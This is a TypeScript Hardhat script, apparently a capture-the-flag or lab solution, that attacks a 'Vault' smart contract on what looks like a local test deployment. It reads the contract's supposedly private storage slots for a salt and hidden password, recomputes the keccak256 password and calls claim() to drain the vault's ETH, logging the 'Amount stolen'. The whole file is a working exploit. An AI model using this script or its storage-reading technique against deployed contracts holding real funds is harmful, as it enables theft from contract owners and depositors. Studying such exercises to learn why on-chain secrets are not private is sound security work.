import { ethers } from "hardhat";

async function main() {
  const [attacker] = await ethers.getSigners();

  console.log("🔓 Starting Vault Attack");
  console.log("==========================");
  console.log("Attacker address:", attacker.address);
  console.log(
    "Attacker balance before attack:",
    ethers.formatEther(await ethers.provider.getBalance(attacker.address)),
    "ETH"
  );

  // Replace with the actual deployed vault address
  const vaultAddress: string = "0x5FbDB2315678afecb367f032d93F642f64180aa3";

  if (vaultAddress === "0x...") {
    console.error(
      "❌ Please update the vaultAddress in scripts/attack.ts with the actual deployed contract address"
    );
    process.exit(1);
  }

  // Get the vault contract instance
  const vault = await ethers.getContractAt("Vault", vaultAddress);

  console.log("\n📖 Reading Private Storage");
  console.log("==========================");

  // Read private storage slots <<<---------------------------------- THE ONLY IMPORTANT PART OF THE ATTACK
  // Slot 0: salt (uint256)
  // Slot 1: hiddenPassword (uint256)
  const saltSlot = await ethers.provider.getStorage(vaultAddress, 0);
  const hiddenPasswordSlot = await ethers.provider.getStorage(vaultAddress, 1);

  console.log("Storage slot 0 (salt):", saltSlot);
  console.log("Storage slot 1 (hiddenPassword):", hiddenPasswordSlot);

  // Convert storage values to numbers
  const salt = Number(saltSlot);
  const hiddenPassword = Number(hiddenPasswordSlot);

  console.log("\n🔍 Decoded Values");
  console.log("=================");
  console.log("Salt:", salt);
  console.log("Hidden password:", hiddenPassword);

  // Compute the password: keccak256(abi.encode(hiddenPassword + salt))
  const passwordInput = hiddenPassword + salt;
  const password = ethers.keccak256(
    ethers.AbiCoder.defaultAbiCoder().encode(["uint256"], [passwordInput])
  );

  console.log("\n🔐 Password Computation");
  console.log("=======================");
  console.log("Password input (hiddenPassword + salt):", passwordInput);
  console.log("Computed password:", password);

  // Check vault balance before attack
  const vaultBalanceBefore = await ethers.provider.getBalance(vaultAddress);
  console.log(
    "\n💰 Vault Balance Before Attack:",
    ethers.formatEther(vaultBalanceBefore),
    "ETH"
  );

  if (vaultBalanceBefore === 0n) {
    console.log("❌ Vault has no funds to steal!");
    process.exit(1);
  }

  // Claim the funds
  console.log("\n⚡ Executing Attack");
  console.log("==================");
  console.log("Attempting to claim funds...");

  try {
    const claimTx = await vault.claim(password);
    console.log("Transaction sent:", claimTx.hash);

    const receipt = await claimTx.wait();
    console.log("Transaction confirmed in block:", receipt?.blockNumber);

    console.log("\n✅ Attack Successful!");
    console.log("=====================");
    console.log("Transaction hash:", claimTx.hash);
    console.log(
      "Attacker balance after attack:",
      ethers.formatEther(await ethers.provider.getBalance(attacker.address)),
      "ETH"
    );
    console.log(
      "Vault balance after attack:",
      ethers.formatEther(await ethers.provider.getBalance(vaultAddress)),
      "ETH"
    );

    console.log(
      "Amount stolen:",
      ethers.formatEther(vaultBalanceBefore),
      "ETH"
    );
  } catch (error) {
    console.error("❌ Attack failed:", error);
    process.exit(1);
  }
}

main()
  .then(() => {
    console.log("\n🎉 Attack completed successfully!");
    process.exit(0);
  })
  .catch((error) => {
    console.error("💥 Attack failed:", error);
    process.exit(1);
  });
